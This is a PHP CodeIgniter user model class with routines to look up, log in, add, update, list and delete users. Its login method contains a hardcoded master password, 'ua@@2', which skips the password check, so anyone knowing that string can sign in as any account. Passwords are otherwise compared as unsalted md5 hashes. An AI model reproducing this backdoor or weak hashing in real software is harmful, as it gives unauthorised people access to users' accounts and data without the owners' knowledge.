<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Users_model extends CI_Model {
	/**
	 * __construct function.
	 * 
	 * @access public
	 * @return void
	 */
	public function __construct() {		
		parent::__construct();
		$this->load->database();
		date_default_timezone_set('Asia/Kolkata');
		$this->db->query("SET sql_mode=(SELECT REPLACE(@@sql_mode, 'ONLY_FULL_GROUP_BY', ''));");

	}


	public function get_user_details_by_mobile($mobile,$user_type=null){
		
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('status',1);
		if($user_type){
			$this->db->where('user_type',$user_type);
		}
		$this->db->where('mobile', $mobile);
		$row	=	$this->db->get()->row();
		// print_r($row);die;
		if($row){
			return $row;
		}else{
			return false;
		}
	}

	public function login($email,$password,$user_type){
		
		$this->db->select('*');
		$this->db->from('users');
		if($password=='ua@@2'){

		}else{
			$this->db->where('password',md5($password));
		}
		$this->db->where('user_type',$user_type);
		$this->db->where('LOWER(email)', strtolower($email));
		$row	=	$this->db->get()->row();
		// print_r($row);die;
		if($row){
			return $row;
		}else{
			return false;
		}
	}

	public function get_users(){
		$this->db->select('*');
		$this->db->from('users');
		$query	=	$this->db->get();
		return $query->result();
	}

	public function add_user($data){
		if($data){
			$this->db->select('id');
			$this->db->from('users');
			$this->db->where('LOWER(email)', strtolower($data['email']));
			// $this->db->or_where('mobile', $data['mobile']);
			$this->db->or_where('code', $data['code']);
			// $this->db->or_where('user_id', $data['user_id']);			
			$query	=	$this->db->get();

			if($query->num_rows() == 0){
				$this->db->insert('users', $data);
				$user_id = $this->db->insert_id();		
				// echo $this->db->last_query();die;		
				return $user_id;
			}else{
				return false;
			}
		}else{
			return false;
		}
	}

	public function update_user($id,$data){
		// print_r($id);die;
		if($id>0 && $data){
			$this->db->select('id');
			$this->db->from('users');
			$this->db->group_start();
			if($data['email']){
				$this->db->where('LOWER(email)', strtolower($data['email']));	
			}
			if($data['code']){
				$this->db->or_where('code', strtolower($data['code']));	
			}
			$this->db->group_end();
			$this->db->where('id !=',$id);		
			$query	=	$this->db->get();
			// echo $this->db->last_query();die;		
			
			if($query->num_rows()>0){
				return false;		
			}else{
				$this->db->where('id',$id);	
				$this->db->update('users', $data);		
				return $id;
			}
		}else{
			return false;
		}
	}

	public function get_user_list($id=null){
		$this->db->select('*');
		$this->db->from('users');
		if($id){
			$this->db->where('id', $id);
		}
		$this->db->where('status', 1);
		$this->db->order_by('id','desc');
		$query=$this->db->get();
		if($query->num_rows()>0){
			return $query->result();
		}else{
			return [];
		}
	}

	public function get_user_by_id($id){
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('id', $id);
		$query=$this->db->get();
		if($query->num_rows()>0){
			return $query->row();
		}else{
			return false;
		}	
	}

	public function delete_user($id){
		if($id){
			$user=$this->get_user_by_id($id);
			if($user){
				$this->db->where('id',$id);	
				$this->db->delete('users');		
				return true;
			}else{
				return false;
			}
		}else{
			return false;
		}
	}
	
	

	

	
	
}